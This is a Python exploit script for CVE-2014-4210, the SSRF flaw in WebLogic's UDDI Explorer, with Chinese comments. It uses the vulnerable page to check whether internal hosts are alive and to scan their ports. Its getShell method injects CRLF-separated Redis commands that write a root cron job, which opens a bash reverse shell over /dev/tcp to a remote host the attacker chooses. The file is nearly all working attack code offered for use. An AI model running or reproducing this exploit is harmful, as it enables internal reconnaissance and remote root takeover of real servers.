# /usr/bin/env python
# coding=utf-8

import requests


class WeblogicExp:
    """
    CVE-2014-4210
    利用HTTP CRLF Injection注入
    """
    def __init__(self, url):
        """
        :param url:例如 http://www.exapmple.com:9090/uddiexplorer/SearchPublicRegistries.jsp
        :return:
        """
        self.url = url
        self.url_query = "rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business location&btnSubmit=Search"

    def liveDetect(self, ip):
        """
        IP存活判断
        通常就是访问22端口[Linux]以及445端口[Windows]
        :param ip:主机的IP
        :return:
        """
        url_1 = self.url + "?operator=" + "http://" + ip + ":22" + "&" + self.url_query
        url_2 = self.url + "?operator=" + "http://" + ip + ":445" + "&" + self.url_query
        result = self.httpRequest(url_1)        # 测试22端口以及445端口
        if result:                              # 开启22端口
            if "response" in result:
                return 1
            else:
                result = self.httpRequest(url_2)
                if result:
                    if "response" in result:    #开启445端口
                        return 1
                    else:
                        return -1
                else:
                    return 0
        else:
            return 0

    def portScan(self, ip, port):
        """
        IP端口扫描
        也可以通过http://www.example.com/uddiexplorer/SetupUDDIExplorer.jsp获取，但是可能不准确
        :param ip:
        :return:
        """
        url = self.url + "?operator=" + "http://" + ip + ":" + port + "&" + self.url_query
        result = self.httpRequest(url)
        if result:
            if "response" in result:
                return 1
            else:
                return -1
        else:
            return 0

    def getShell(self, localhost, localport, remotehost, remoteport, application):
        """
        :param localhost:内网机器的IP
        :param localport:内网机器的端口
        :param remotehost:远程机器IP
        :param remoteport:远程机器端口
        :param application:应用类型，这里是redis
        :return:
        """
        payload = """http://localhost:localport/ssrf\r\nsave\r\nflushdb\r\nconfig set dir /var/spool/cron\r\nconfig set dbfilename root\r\nset cron \"\n\n*/1 * * * * /bin/bash -i >%26 /dev/tcp/remotehost/remoteport 0>%261\n\n\"\r\nsave\r\nquit\r\n"""
        url = self.url + "?operator=" + payload + "&" + self.url_query
        url = url.replace("localhost", localhost)
        url = url.replace("localport", localport)
        url = url.replace("remotehost", remotehost)
        url = url.replace("remoteport", remoteport)
        result = self.httpRequest(url)

    def serviceDetect(self):
        """
        服务识别，到时候建立一个字典就好了
        :return:
        """
        pass

    def httpRequest(self, url):
        session = requests.Session()
        session.mount("http://", requests.adapters.HTTPAdapter(max_retries=3))
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=3))
        try:
            response = session.get(url, timeout=10)
            return response.text
        except Exception as err:
            # 如果出现超时，这
            print err, "\r\n"
            return None